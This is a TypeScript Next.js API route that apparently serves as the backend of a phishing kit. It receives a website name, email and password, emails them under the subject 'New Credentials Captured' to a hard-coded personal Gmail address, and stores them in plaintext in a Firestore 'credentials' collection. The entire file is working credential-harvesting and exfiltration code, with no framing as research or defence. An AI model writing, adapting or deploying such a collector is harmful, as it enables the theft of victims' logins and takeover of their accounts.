import { NextResponse } from 'next/server';
import { db } from '@/lib/firebase';
import { Resend } from 'resend';

export async function POST(request: Request) {
  try {

    const resend = new Resend(process.env.RESEND_API_KEY);
    const body = await request.json();
    const { uid, websiteName, email, password } = body;
    
    if (!websiteName) {
      return NextResponse.json({ error: "Missing required fields" }, { status: 400 });
    }

    const websitename = websiteName.replaceAll(" ", "-");

    if (!uid || !websitename || !email || !password) {
      return NextResponse.json({ error: "All fields are required." }, { status: 400 });
    }

    const emailHtml = `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
        <h2 style="color: #333; border-bottom: 2px solid #eee; padding-bottom: 10px;">New Credentials Captured</h2>
        
        <div style="background: #f9f9f9; padding: 15px; border-radius: 5px; margin: 20px 0;">
          <p style="margin: 10px 0;"><strong>Website:</strong> ${websitename}</p>
          <p style="margin: 10px 0;"><strong>Email/Username:</strong> ${email}</p>
          <p style="margin: 10px 0;"><strong>Password:</strong> ${password}</p>
          <p style="margin: 10px 0;"><strong>User ID:</strong> ${uid}</p>
          <p style="margin: 10px 0;"><strong>Time:</strong> ${new Date().toLocaleString()}</p>
        </div>
        
        <div style="color: #666; font-size: 12px; margin-top: 20px; padding-top: 10px; border-top: 1px solid #eee;">
          <p>This is an automated notification. Please do not reply to this email.</p>
        </div>
      </div>
    `;

    await resend.emails.send({
      from: 'onboarding@resend.dev',
      to: 'nandakishorep113@gmail.com',
      subject: `New Credentials Captured - ${websitename}`,
      html: emailHtml
    });

    // Check if a document with the same uid, email, and password exists
    const existingDocs = await db.collection("credentials")
      .where("uid", "==", uid)
      .where("email", "==", email)
      .where("password", "==", password)
      .get();
    
    if (!existingDocs.empty) {
      return NextResponse.json(
        { error: "Duplicate entry: uid, email, and password already exist." }, 
        { status: 409 }
      );
    }

    await db.collection("credentials").add({
      uid,
      websitename,
      email,
      password,
      createdAt: new Date(),
    });
    
    
    return NextResponse.json({ message: "Data inserted successfully." }, { status: 200 });
  } catch {
    return NextResponse.json({ error: "Failed to insert data." }, { status: 500 });
  }
}